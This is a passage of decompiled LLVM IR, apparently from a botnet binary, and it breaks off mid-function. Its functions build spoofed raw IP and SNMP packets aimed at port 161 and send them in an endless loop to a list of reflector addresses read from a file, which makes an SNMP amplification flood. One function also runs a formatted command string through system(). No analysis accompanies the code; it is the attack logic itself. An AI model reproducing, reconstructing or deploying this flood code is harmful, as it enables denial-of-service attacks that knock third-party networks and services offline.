  ret i32 %v1_b578

; uselistorder directives
  uselistorder i32 %v1_b4e8, { 2, 1, 0 }
  uselistorder i32 %v2_b458, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_b430, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_b42c, { 1, 0 }
  uselistorder i32 %storemerge153, { 3, 2, 1, 0 }
  uselistorder i32 %v3_b3e0, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v1_b340, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_b304, { 1, 0 }
  uselistorder i32 %v3_b2e4, { 2, 1, 0 }
  uselistorder i32 %v0_b278, { 1, 0 }
  uselistorder i32 %v2_b214, { 1, 2, 0, 3 }
  uselistorder i32 %v2_b1d8, { 1, 0, 2 }
  uselistorder i32 %v1_b1b0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_b19c, { 1, 0 }
  uselistorder i32* %v1_b194, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_b190, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 10, 8, 9, 40, 11, 12, 13, 14, 15, 16, 17, 18, 19, 23, 21, 20, 22, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 5, 3, 4, 15, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 0 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_b56c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b564, { 1, 0 }
  uselistorder label %dec_label_pc_b41c, { 1, 0 }
  uselistorder label %dec_label_pc_b30c, { 1, 0 }
  uselistorder label %dec_label_pc_b18c, { 1, 0 }
  uselistorder label %dec_label_pc_b160, { 1, 0 }
}

define i32 @setup_snmp_header(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v1_b59c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_b59c, i32* @ip, align 4
  %v1_b5b8 = call i32 @__GI_htons(i32 4500)
  %sext = mul i32 %v1_b5b8, 65536
  %v1_b5bc = sdiv i32 %sext, 65536
  %v1_b5c8 = trunc i32 %v1_b5bc to i16
  store i16 %v1_b5c8, i16* %arg1, align 2
  %v1_b5d0 = call i32 @__GI_htons(i32 161)
  %v1_b5e0 = trunc i32 %v1_b5d0 to i16
  %v3_b5e0 = add i32 %tmp, 2
  %v4_b5e0 = inttoptr i32 %v3_b5e0 to i16*
  store i16 %v1_b5e0, i16* %v4_b5e0, align 2
  %v3_b5ec = add i32 %tmp, 6
  %v4_b5ec = inttoptr i32 %v3_b5ec to i16*
  store i16 0, i16* %v4_b5ec, align 2
  %v1_b5f4 = add i32 %tmp, 8
  store i32 %v1_b5f4, i32* @r3, align 4
  store i32 %v1_b5f4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_37140.172 to i32), i32* @r1, align 4
  store i32 67, i32* @r2, align 4
  %v0_b604 = call i32 @memcpy()
  %v1_b60c = call i32 @__GI_htons(i32 75)
  %v2_b60c = trunc i32 %v1_b60c to i16
  %v3_b61c = add i32 %tmp, 4
  %v4_b61c = inttoptr i32 %v3_b61c to i16*
  store i16 %v2_b60c, i16* %v4_b61c, align 2
  ret i32 %v1_b60c
}

define i32 @setup_ip_header(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i8 69, i8* %arg1, align 1
  %v3_b694 = add i32 %tmp, 1
  %v4_b694 = inttoptr i32 %v3_b694 to i8*
  store i8 0, i8* %v4_b694, align 1
  %v3_b6a0 = add i32 %tmp, 2
  %v4_b6a0 = inttoptr i32 %v3_b6a0 to i16*
  store i16 42, i16* %v4_b6a0, align 2
  %v1_b6ac = call i32 @__GI_htonl(i32 64074)
  %v1_b6c0 = trunc i32 %v1_b6ac to i16
  %v3_b6c0 = add i32 %tmp, 4
  %v4_b6c0 = inttoptr i32 %v3_b6c0 to i16*
  store i16 %v1_b6c0, i16* %v4_b6c0, align 2
  %v3_b6cc = add i32 %tmp, 6
  %v4_b6cc = inttoptr i32 %v3_b6cc to i16*
  store i16 0, i16* %v4_b6cc, align 2
  %v3_b6d8 = add i32 %tmp, 8
  %v4_b6d8 = inttoptr i32 %v3_b6d8 to i8*
  store i8 -1, i8* %v4_b6d8, align 1
  %v3_b6e4 = add i32 %tmp, 9
  %v4_b6e4 = inttoptr i32 %v3_b6e4 to i8*
  store i8 17, i8* %v4_b6e4, align 1
  %v3_b6f0 = add i32 %tmp, 10
  %v4_b6f0 = inttoptr i32 %v3_b6f0 to i16*
  store i16 0, i16* %v4_b6f0, align 2
  store i32 ptrtoint ([13 x i8]* @global_var_37184.174 to i32), i32* @r0, align 4
  %v2_b6f8 = call i32 @inet_addr(i32 ptrtoint ([13 x i8]* @global_var_37184.174 to i32))
  %v2_b704 = add i32 %tmp, 12
  %v3_b704 = inttoptr i32 %v2_b704 to i32*
  store i32 %v2_b6f8, i32* %v3_b704, align 4
  ret i32 %v2_b6f8
}

define i32 @snmpflood(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4156 = alloca i32, align 4
  %stack_var_-4136 = alloca i32, align 4
  %v2_b758 = ptrtoint i32* %stack_var_-4136 to i32
  %v1_b764 = add i32 %v2_b758, 20
  %v5_b768 = inttoptr i32 %v1_b764 to i16*
  %v3_b784 = add i32 %arg1, 12
  %v4_b784 = inttoptr i32 %v3_b784 to i32*
  %v5_b784 = load i32, i32* %v4_b784, align 4
  %v1_b790 = add i32 %arg1, 4
  %v2_b790 = inttoptr i32 %v1_b790 to i32*
  %v3_b790 = load i32, i32* %v2_b790, align 4
  %v3_b7a4 = call i32 @socket(i32 2, i32 3, i32 6)
  %v1_b7b4 = icmp slt i32 %v3_b7a4, 0
  br i1 %v1_b7b4, label %dec_label_pc_b7bc, label %dec_label_pc_b7c4

dec_label_pc_b7bc:                                ; preds = %entry
  %v1_b7c0 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_b7c4

dec_label_pc_b7c4:                                ; preds = %entry, %dec_label_pc_b7bc
  %v2_b7c8 = call i32 @__GI_time(i32* null)
  %v1_b7d4 = call i32 @init_rand(i32 %v2_b7c8)
  store i32 %v2_b758, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v0_b7f0 = call i32 @__GI_memset()
  %v1_b7f8 = bitcast i32* %stack_var_-4136 to i8*
  %v2_b7f8 = call i32 @setup_ip_header(i8* %v1_b7f8)
  %v2_b800 = call i32 @setup_snmp_header(i16* %v5_b768)
  %v0_b804 = call i32 @rand()
  %v2_b824 = sdiv i32 %v0_b804, 13107
  %tmp33 = mul i32 %v2_b824, -65535
  %v2_b848 = add i32 %tmp33, %v0_b804
  %fold = add i32 %v2_b848, 64510
  %v3_b870 = urem i32 %fold, 65536
  %v1_b878 = call i32 @__GI_htons(i32 %v3_b870)
  %v1_b888 = trunc i32 %v1_b878 to i16
  store i16 %v1_b888, i16* %v5_b768, align 4
  %v2_b8ac = add i32 %v2_b758, 12
  %v3_b8ac = inttoptr i32 %v2_b8ac to i32*
  store i32 %v5_b784, i32* %v3_b8ac, align 4
  %v1_b8b4 = add i32 %v3_b790, 4
  %v2_b8b4 = inttoptr i32 %v1_b8b4 to i32*
  %v3_b8b4 = load i32, i32* %v2_b8b4, align 4
  %v2_b8bc = add i32 %v2_b758, 16
  %v3_b8bc = inttoptr i32 %v2_b8bc to i32*
  store i32 %v3_b8b4, i32* %v3_b8bc, align 4
  %v1_b8d0 = or i32 %v2_b758, 2
  %v2_b8d0 = inttoptr i32 %v1_b8d0 to i16*
  %v3_b8d0 = load i16, i16* %v2_b8d0, align 2
  %div = udiv i16 %v3_b8d0, 2
  %v3_b8d4 = zext i16 %div to i32
  %v2_b8e8 = bitcast i32* %stack_var_-4136 to i16*
  %v3_b8e8 = call i32 @csum(i16* %v2_b8e8, i32 %v3_b8d4)
  %v1_b8f8 = trunc i32 %v3_b8e8 to i16
  %v3_b8f8 = add i32 %v2_b758, 10
  %v4_b8f8 = inttoptr i32 %v3_b8f8 to i16*
  store i16 %v1_b8f8, i16* %v4_b8f8, align 2
  store i32 1, i32* %stack_var_-4156, align 4
  %v2_b918 = ptrtoint i32* %stack_var_-4156 to i32
  %v5_b938 = call i32 @__GI_setsockopt(i32 %v3_b7a4, i32 0, i32 3, i32 %v2_b918, i32 4)
  %v1_b940 = icmp slt i32 %v5_b938, 0
  br i1 %v1_b940, label %dec_label_pc_b948, label %dec_label_pc_b950

dec_label_pc_b948:                                ; preds = %dec_label_pc_b7c4
  %v1_b94c = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_b950

dec_label_pc_b950:                                ; preds = %dec_label_pc_b7c4, %dec_label_pc_b948
  %v2_b954 = call i32 @__GI_time(i32* null)
  %v1_b960 = call i32 @init_rand(i32 %v2_b954)
  %v3_b9e8 = add i32 %v2_b758, 4
  %v4_b9e8 = inttoptr i32 %v3_b9e8 to i16*
  br label %dec_label_pc_b970

dec_label_pc_b970:                                ; preds = %dec_label_pc_ba70, %dec_label_pc_b950
  %stack_var_-28.0 = phi i32 [ %v3_b790, %dec_label_pc_b950 ], [ %v3_b9b0, %dec_label_pc_ba70 ]
  %storemerge5 = phi i32 [ 0, %dec_label_pc_b950 ], [ %v1_ba78, %dec_label_pc_ba70 ]
  %v3_b974 = load i16, i16* %v2_b8d0, align 2
  %v4_b974 = zext i16 %v3_b974 to i32
  %v6_b9a8 = call i32 @sendto(i32 %v3_b7a4, i32 %v2_b758, i32 %v4_b974, i32 0, i32 %stack_var_-28.0, i32 16)
  %v1_b9b0 = add i32 %stack_var_-28.0, 532
  %v2_b9b0 = inttoptr i32 %v1_b9b0 to i32*
  %v3_b9b0 = load i32, i32* %v2_b9b0, align 4
  %v1_b9bc = add i32 %v3_b9b0, 4
  %v2_b9bc = inttoptr i32 %v1_b9bc to i32*
  %v3_b9bc = load i32, i32* %v2_b9bc, align 4
  store i32 %v3_b9bc, i32* %v3_b8bc, align 4
  %v0_b9c8 = call i32 @rand_cmwc()
  %v1_b9d4 = call i32 @__GI_htonl(i32 %v0_b9c8)
  %v1_b9e8 = trunc i32 %v1_b9d4 to i16
  store i16 %v1_b9e8, i16* %v4_b9e8, align 4
  %v3_b9fc = load i16, i16* %v2_b8d0, align 2
  %div34 = udiv i16 %v3_b9fc, 2
  %v3_ba00 = zext i16 %div34 to i32
  %v3_ba14 = call i32 @csum(i16* %v2_b8e8, i32 %v3_ba00)
  %v1_ba24 = trunc i32 %v3_ba14 to i16
  store i16 %v1_ba24, i16* %v4_b8f8, align 2
  %v2_ba2c = load i32, i32* @global_var_526bc.176, align 4
  %v1_ba30 = add i32 %v2_ba2c, 1
  store i32 %v1_ba30, i32* @global_var_526bc.176, align 4
  %v2_ba40 = load i32, i32* @global_var_52590.178, align 4
  %tmp = icmp ugt i32 %v2_ba40, %storemerge5
  br i1 %tmp, label %dec_label_pc_ba70, label %dec_label_pc_ba54

dec_label_pc_ba54:                                ; preds = %dec_label_pc_b970
  %v2_ba64 = load i32, i32* @global_var_4535c.180, align 4
  %v1_ba6c = call i32 @usleep(i32 %v2_ba64)
  br label %dec_label_pc_ba70

dec_label_pc_ba70:                                ; preds = %dec_label_pc_b970, %dec_label_pc_ba54
  %stack_var_-4168.0 = phi i32 [ %storemerge5, %dec_label_pc_b970 ], [ 0, %dec_label_pc_ba54 ]
  %v1_ba78 = add i32 %stack_var_-4168.0, 1
  br label %dec_label_pc_b970

; uselistorder directives
  uselistorder i32 %v3_b9b0, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v0_b804, { 1, 0 }
  uselistorder i32 %v2_b758, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder i32* %stack_var_-4136, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4156, { 1, 0 }
  uselistorder label %dec_label_pc_ba70, { 1, 0 }
  uselistorder label %dec_label_pc_b950, { 1, 0 }
  uselistorder label %dec_label_pc_b7c4, { 1, 0 }
}

define i32 @snmp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-1152 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_ba94 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_ba94, i32* %ip.global-to-local, align 4
  store i32 47776, i32* %stack_var_-4, align 4
  %v2_ba9c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ba9c, i32* @fp, align 4
  %v2_baa4 = ptrtoint i32* %stack_var_-1152 to i32
  store i32 %v2_baa4, i32* %r3.global-to-local, align 4
  %v1_bac4 = call i32 @mfork(i32 %arg2)
  store i32 %v1_bac4, i32* %r3.global-to-local, align 4
  %v2_bacc = icmp eq i32 %v1_bac4, 0
  br i1 %v2_bacc, label %dec_label_pc_bad4, label %dec_label_pc_c0cc

dec_label_pc_bad4:                                ; preds = %entry
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 255, i32* %r2.global-to-local, align 4
  %v3_bae0 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v3_bae0, i32* %r3.global-to-local, align 4
  %v1_baf0 = icmp slt i32 %v3_bae0, 0
  br i1 %v1_baf0, label %dec_label_pc_baf8, label %dec_label_pc_bb00

dec_label_pc_baf8:                                ; preds = %dec_label_pc_bad4
  %v1_bafc = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_bb00

dec_label_pc_bb00:                                ; preds = %dec_label_pc_bad4, %dec_label_pc_baf8
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v8_bb08 = icmp sgt i32 %arg3, 5
  br i1 %v8_bb08, label %dec_label_pc_bb24, label %dec_label_pc_bb0c

dec_label_pc_bb0c:                                ; preds = %dec_label_pc_bb00
  store i32 ptrtoint ([99 x i8]* @global_var_37194.182 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_bb18 = call i32 @Send(i32 %arg1, i32 ptrtoint ([99 x i8]* @global_var_37194.182 to i32))
  %v1_bb20 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_bb24

dec_label_pc_bb24:                                ; preds = %dec_label_pc_bb00, %dec_label_pc_bb0c
  %v1_bb28 = add i32 %arg4, 12
  store i32 %v1_bb28, i32* %r3.global-to-local, align 4
  %v1_bb2c = inttoptr i32 %v1_bb28 to i32*
  %v2_bb2c = load i32, i32* %v1_bb2c, align 4
  store i32 %v2_bb2c, i32* %r3.global-to-local, align 4
  %v1_bb30 = inttoptr i32 %v2_bb2c to i8*
  %v3_bb34 = call i32 @strlen(i8* %v1_bb30)
  %v2_bb44 = mul i32 %v3_bb34, 5
  %v1_bb48 = add i32 %v2_bb44, 165
  store i32 %v1_bb48, i32* %r2.global-to-local, align 4
  store i32 1023, i32* %r3.global-to-local, align 4
  %v8_bb60 = icmp sgt i32 %v1_bb48, 1023
  br i1 %v8_bb60, label %dec_label_pc_c0cc, label %dec_label_pc_bb64

dec_label_pc_bb64:                                ; preds = %dec_label_pc_bb24
  store i32 %v1_bb48, i32* %ip.global-to-local, align 4
  store i32 %v1_bb28, i32* %r3.global-to-local, align 4
  %v2_bb70 = load i32, i32* %v1_bb2c, align 4
  store i32 %v2_bb70, i32* @lr, align 4
  store i32 %v1_bb28, i32* %r3.global-to-local, align 4
  %v2_bb7c = load i32, i32* %v1_bb2c, align 4
  store i32 %v2_bb7c, i32* @r4, align 4
  store i32 %v1_bb28, i32* %r3.global-to-local, align 4
  %v2_bb88 = load i32, i32* %v1_bb2c, align 4
  store i32 %v2_bb88, i32* %r1.global-to-local, align 4
  store i32 %v1_bb28, i32* %r3.global-to-local, align 4
  %v2_bb94 = load i32, i32* %v1_bb2c, align 4
  %v2_bba8 = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_bb7c, i32* %stack_var_-1152, align 4
  store i32 %v2_bba8, i32* @r0, align 4
  store i32 %v1_bb48, i32* @r1, align 4
  store i32 ptrtoint ([176 x i8]* @global_var_371f8.184 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_bb70, i32* %r3.global-to-local, align 4
  %v8_bbcc = call i32 @__GI_snprintf(i32 %v2_bba8, i32 %v1_bb48, i32 ptrtoint ([176 x i8]* @global_var_371f8.184 to i32), i32 %v2_bb70, i32 %v2_bb7c, i32 %v2_bb88, i32 %v2_bb94)
  store i32 %v2_bba8, i32* %r3.global-to-local, align 4
  %v1_bbdc = call i32 @system(i32 %v2_bba8)
  %v2_bbe4 = call i32 @__GI_time(i32* null)
  store i32 %v2_bbe4, i32* %r3.global-to-local, align 4
  %v1_bbf0 = call i32 @srand(i32 %v2_bbe4)
  store i32 ptrtoint (i32* @global_var_536c4.157 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* @global_var_536c4.157, align 4
  store i32 128, i32* %r3.global-to-local, align 4
  %v1_bc18 = call i32 @malloc(i32 128)
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v1_bc18, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_bc34 = call i32 @__GI_memset()
  %v1_bc44 = add i32 %arg4, 16
  store i32 %v1_bc44, i32* %r3.global-to-local, align 4
  %v1_bc48 = inttoptr i32 %v1_bc44 to i32*
  %v2_bc48 = load i32, i32* %v1_bc48, align 4
  store i32 %v2_bc48, i32* %r3.global-to-local, align 4
  store i32 %v2_bc48, i32* @r0, align 4
  %v1_bc50 = call i32 @atol(i32 %v2_bc48)
  %v1_bc60 = add i32 %arg4, 20
  store i32 %v1_bc60, i32* %r3.global-to-local, align 4
  %v1_bc64 = inttoptr i32 %v1_bc60 to i32*
  %v2_bc64 = load i32, i32* %v1_bc64, align 4
  store i32 %v2_bc64, i32* %r3.global-to-local, align 4
  store i32 %v2_bc64, i32* @r0, align 4
  %v1_bc6c = call i32 @atol(i32 %v2_bc64)
  store i32 0, i32* @global_var_52590.178, align 4
  store i32 ptrtoint (i32* @global_var_526bc.176 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* @global_var_526bc.176, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_372a8.189 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_37118.168 to i32), i32* @r1, align 4
  %v3_bca0 = call i32 @__GI_fopen(i32 ptrtoint ([9 x i8]* @global_var_372a8.189 to i32), i32 ptrtoint ([2 x i8]* @global_var_37118.168 to i32))
  store i32 %v3_bca0, i32* %r3.global-to-local, align 4
  %v1_bcb4 = add i32 %v0_bc34, -1
  %v4_bcb8 = inttoptr i32 %v0_bc34 to i8*
  br label %dec_label_pc_be0c.outer

dec_label_pc_bcb0:                                ; preds = %dec_label_pc_be0c
  store i32 %v0_bc34, i32* %r3.global-to-local, align 4
  %v3_bcbc = call i32 @strlen(i8* %v4_bcb8)
  %v2_bcc4 = add i32 %v1_bcb4, %v3_bcbc
  store i32 %v2_bcc4, i32* %r3.global-to-local, align 4
  %v1_bcc8 = inttoptr i32 %v2_bcc4 to i8*
  %v2_bcc8 = load i8, i8* %v1_bcc8, align 1
  %v3_bcc8 = zext i8 %v2_bcc8 to i32
  store i32 %v3_bcc8, i32* %r3.global-to-local, align 4
  %v7_bccc = icmp eq i8 %v2_bcc8, 10
  br i1 %v7_bccc, label %dec_label_pc_bcf8, label %dec_label_pc_bcd4

dec_label_pc_bcd4:                                ; preds = %dec_label_pc_bcb0
  store i32 %v0_bc34, i32* %r3.global-to-local, align 4
  store i32 %v1_bcb4, i32* @r4, align 4
  %v3_bce0 = call i32 @strlen(i8* %v4_bcb8)
  %v0_bce8 = load i32, i32* @r4, align 4
  %v2_bce8 = add i32 %v0_bce8, %v3_bce0
  store i32 %v2_bce8, i32* %r3.global-to-local, align 4
  %v1_bcec = inttoptr i32 %v2_bce8 to i8*
  %v2_bcec = load i8, i8* %v1_bcec, align 1
  %v3_bcec = zext i8 %v2_bcec to i32
  store i32 %v3_bcec, i32* %r3.global-to-local, align 4
  %v7_bcf0 = icmp eq i8 %v2_bcec, 13
  br i1 %v7_bcf0, label %dec_label_pc_bcf8, label %dec_label_pc_be0c

dec_label_pc_bcf8:                                ; preds = %dec_label_pc_bcd4, %dec_label_pc_bcb0
  store i32 %v0_bc34, i32* %r3.global-to-local, align 4
  store i32 %v1_bcb4, i32* @r4, align 4
  %v3_bd04 = call i32 @strlen(i8* %v4_bcb8)
  %v0_bd0c = load i32, i32* @r4, align 4
  %v2_bd0c = add i32 %v0_bd0c, %v3_bd04
  store i32 %v2_bd0c, i32* %r2.global-to-local, align 4
  %v3_bd14 = inttoptr i32 %v2_bd0c to i8*
  store i8 0, i8* %v3_bd14, align 1
  %v2_bd1c = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_bd1c, i32* %r3.global-to-local, align 4
  %v2_bd20 = icmp eq i32 %v2_bd1c, 0
  %v1_bd2c = call i32 @malloc(i32 540)
  store i32 %v1_bd2c, i32* %r3.global-to-local, align 4
  br i1 %v2_bd20, label %dec_label_pc_bd28, label %dec_label_pc_bd98

dec_label_pc_bd28:                                ; preds = %dec_label_pc_bcf8
  store i32 %v1_bd2c, i32* %r2.global-to-local, align 4
  store i32 %v1_bd2c, i32* @global_var_536c4.157, align 4
  store i32 %v1_bd2c, i32* %r3.global-to-local, align 4
  store i32 %v1_bd2c, i32* @r0, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_bd50 = call i32 @bzero(i32 %v1_bd2c, i32 16)
  store i32 ptrtoint (i32* @global_var_536c4.157 to i32), i32* %r3.global-to-local, align 4
  %v2_bd58 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_bd58, i32* @r4, align 4
  store i32 %v0_bc34, i32* @r0, align 4
  %v1_bd60 = call i32 @inet_addr(i32 %v0_bc34)
  %v1_bd68 = load i32, i32* @r4, align 4
  %v2_bd68 = add i32 %v1_bd68, 4
  %v3_bd68 = inttoptr i32 %v2_bd68 to i32*
  store i32 %v1_bd60, i32* %v3_bd68, align 4
  %v2_bd70 = load i32, i32* @global_var_536c4.157, align 4
  %v2_bd7c = add i32 %v2_bd70, 532
  %v3_bd7c = inttoptr i32 %v2_bd7c to i32*
  store i32 %v2_bd70, i32* %v3_bd7c, align 4
  %v2_bd84 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_bd84, i32* %r2.global-to-local, align 4
  store i32 %v2_bd84, i32* %r3.global-to-local, align 4
  %v2_bd90 = add i32 %v2_bd84, 536
  %v3_bd90 = inttoptr i32 %v2_bd90 to i32*
  store i32 %v2_bd84, i32* %v3_bd90, align 4
  br label %dec_label_pc_be00

dec_label_pc_bd98:                                ; preds = %dec_label_pc_bcf8
  store i32 %v1_bd2c, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 540, i32* @r2, align 4
  %v0_bdb4 = call i32 @__GI_memset()
  store i32 %v0_bc34, i32* @r0, align 4
  %v1_bdbc = call i32 @inet_addr(i32 %v0_bc34)
  %v2_bdc8 = add i32 %v1_bd2c, 4
  %v3_bdc8 = inttoptr i32 %v2_bdc8 to i32*
  store i32 %v1_bdbc, i32* %v3_bdc8, align 4
  %v2_bdd0 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_bdd0, i32* %r2.global-to-local, align 4
  %v2_bdd8 = add i32 %v1_bd2c, 536
  %v3_bdd8 = inttoptr i32 %v2_bdd8 to i32*
  store i32 %v2_bdd0, i32* %v3_bdd8, align 4
  %v2_bde0 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_bde0, i32* %r3.global-to-local, align 4
  %v1_bde4 = add i32 %v2_bde0, 532
  %v2_bde4 = inttoptr i32 %v1_bde4 to i32*
  %v3_bde4 = load i32, i32* %v2_bde4, align 4
  %v2_bdec = add i32 %v1_bd2c, 532
  %v3_bdec = inttoptr i32 %v2_bdec to i32*
  store i32 %v3_bde4, i32* %v3_bdec, align 4
  %v2_bdf4 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_bdf4, i32* %r2.global-to-local, align 4
  store i32 %v1_bd2c, i32* %r3.global-to-local, align 4
  %v2_bdfc = add i32 %v2_bdf4, 532
  %v3_bdfc = inttoptr i32 %v2_bdfc to i32*
  store i32 %v1_bd2c, i32* %v3_bdfc, align 4
  br label %dec_label_pc_be00

dec_label_pc_be00:                                ; preds = %dec_label_pc_bd28, %dec_label_pc_bd98
  %v1_be04 = add i32 %stack_var_-60.0.ph, 1
  store i32 %v1_be04, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_be0c.outer

dec_label_pc_be0c.outer:                          ; preds = %dec_label_pc_be00, %dec_label_pc_bb64
  %stack_var_-60.0.ph = phi i32 [ %v1_be04, %dec_label_pc_be00 ], [ 0, %dec_label_pc_bb64 ]
  br label %dec_label_pc_be0c

dec_label_pc_be0c:                                ; preds = %dec_label_pc_be0c.outer, %dec_label_pc_bcd4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v3_bca0, i32* %r2.global-to-local, align 4
  %v3_be18 = call i32 @fgets(i32 %v0_bc34, i32 128, i32 %v3_bca0)
  store i32 %v3_be18, i32* %r3.global-to-local, align 4
  %v2_be20 = icmp eq i32 %v3_be18, 0
  br i1 %v2_be20, label %dec_label_pc_be28, label %dec_label_pc_bcb0

dec_label_pc_be28:                                ; preds = %dec_label_pc_be0c
  %v2_be2c = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_be2c, i32* %r3.global-to-local, align 4
  %v1_be30 = add i32 %v2_be2c, 532
  %v2_be30 = inttoptr i32 %v1_be30 to i32*
  %v3_be30 = load i32, i32* %v2_be30, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v2_be44 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_be44, i32* %r1.global-to-local, align 4
  %v4_be48 = add i32 %v2_be44, -1088
  %v5_be48 = inttoptr i32 %v4_be48 to i16*
  store i16 2, i16* %v5_be48, align 4
  %v1_be50 = add i32 %arg4, 4
  store i32 %v1_be50, i32* %r3.global-to-local, align 4
  %v1_be54 = inttoptr i32 %v1_be50 to i32*
  %v2_be54 = load i32, i32* %v1_be54, align 4
  store i32 %v2_be54, i32* %r3.global-to-local, align 4
  store i32 %v2_be54, i32* @r0, align 4
  %v1_be5c = call i32 @inet_addr(i32 %v2_be54)
  %v2_be74 = mul i32 %v1_bc50, 28
  %v1_be7c = add i32 %v2_be74, 14
  %v3_be80 = and i32 %v1_be7c, -8
  %v1_be88 = load i32, i32* @sp, align 4
  %v2_be88 = sub i32 %v1_be88, %v3_be80
  %v1_be8c = add i32 %v2_be88, 16
  store i32 %v1_be8c, i32* %r1.global-to-local, align 4
  %v1_be98 = add i32 %v2_be88, 23
  %v3_be9c = and i32 %v1_be98, -8
  %v2_bef4 = add i32 %v3_be9c, 8
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v1_bc50, i32* %r3.global-to-local, align 4
  %v5_bf7046 = icmp sgt i32 %v1_bc50, 0
  br i1 %v5_bf7046, label %dec_label_pc_bebc, label %dec_label_pc_bf74

dec_label_pc_bebc:                                ; preds = %dec_label_pc_be28, %dec_label_pc_bebc
  %storemerge247 = phi i32 [ %v1_bf5c, %dec_label_pc_bebc ], [ 0, %dec_label_pc_be28 ]
  %v3_bec4 = mul i32 %storemerge247, 4
  %v2_becc = mul i32 %storemerge247, 28
  %v2_bed0 = add i32 %v2_becc, %v3_be9c
  %v2_bed8 = inttoptr i32 %v2_bed0 to i32*
  store i32 %storemerge247, i32* %v2_bed8, align 4
  %v2_bef8 = add i32 %v2_bef4, %v2_becc
  store i32 %v2_bef8, i32* %ip.global-to-local, align 4
  store i32 %v1_be5c, i32* %r1.global-to-local, align 4
  %v1_bf0c = inttoptr i32 %v2_bef8 to i32*
  %v3_bf0c = add i32 %v2_bef8, 4
  %v4_bf0c = inttoptr i32 %v3_bf0c to i32*
  %v5_bf0c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_bf0c, i32* %v4_bf0c, align 4
  %v6_bf0c = add i32 %v2_bef8, 8
  %v7_bf0c = inttoptr i32 %v6_bf0c to i32*
  %v8_bf0c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_bf0c, i32* %v7_bf0c, align 4
  %v9_bf0c = add i32 %v2_bef8, 12
  %v10_bf0c = inttoptr i32 %v9_bf0c to i32*
  %v11_bf0c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_bf0c, i32* %v10_bf0c, align 4
  %v2_bf2c = add i32 %v2_bed0, 4
  %v2_bf34 = inttoptr i32 %v2_bf2c to i32*
  store i32 %v3_be30, i32* %v2_bf34, align 4
  store i32 %v3_be9c, i32* %r1.global-to-local, align 4
